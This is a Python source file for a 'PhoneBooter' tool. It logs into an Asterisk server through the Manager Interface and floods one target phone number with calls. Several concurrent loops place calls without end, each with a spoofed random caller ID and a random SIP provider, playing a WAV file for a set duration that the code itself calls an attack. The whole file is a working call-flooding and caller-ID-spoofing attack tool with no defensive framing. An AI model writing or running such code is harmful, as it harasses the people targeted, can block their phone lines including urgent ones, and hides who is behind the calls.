import asyncio
import threading
from panoramisk.call_manager import CallManager
from libs.generaterandoms import GenerateRandoms
from libs.InitConfig import InitConfig


class PhoneBooter(object):

    def __init__(self):

        self.config = InitConfig()

    @asyncio.coroutine
    def originate(self, targetNum, wav):

        callmanager = CallManager(host=self.config.host,
                                  port=self.config.port,
                                  ssl=self.config.ssl,
                                  encoding='utf8')

        yield from callmanager.connect()

        auth = yield from callmanager.send_action({'Action': 'login',
                                                   'Username': self.config.username,
                                                   'Secret': self.config.secret})

        # if successful, auth.response returns "Success"
        if auth.response != 'Success':
            print("Failed to login!")
            return

        genrand = GenerateRandoms('en_us')

        while True:

            # Pick a random phone number.
            random_number = genrand.phone_number()
            # Pick a random outbound provider.
            random_provider = genrand.provider()

            print("Calling with number: %s" % random_number)

            call = yield from callmanager.send_originate({
                'Action': 'Originate',
                'Channel': 'SIP/{provider}/{num}'.format(num=targetNum, provider=random_provider),
                'WaitTime': 20,
                'CallerID': '{idnum}'.format(idnum=random_number),
                'Application': 'Playback',
                'Data': '{wav}'.format(wav=wav),
                'Async': True
            })


    async def stop_after(self, loop, when):
        await asyncio.sleep(when)
        loop.stop()

    def start(self, targetNum, numThreads, bootLength, wav):

        thread_stop = threading.Event()
        thread = threading.Thread(target=self.launch, args=(targetNum, numThreads, bootLength, wav),
                                  name=targetNum)
        thread.daemon = True
        thread.start()

    def launch(self, targetNum, numThreads, bootLength, wav):
        """Run an attack for the specified number of seconds against the target."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        for x in list(range(numThreads)):
            loop.create_task(self.originate(targetNum, wav))

        loop.create_task(self.stop_after(loop, bootLength))
        loop.run_forever()
        loop.close()
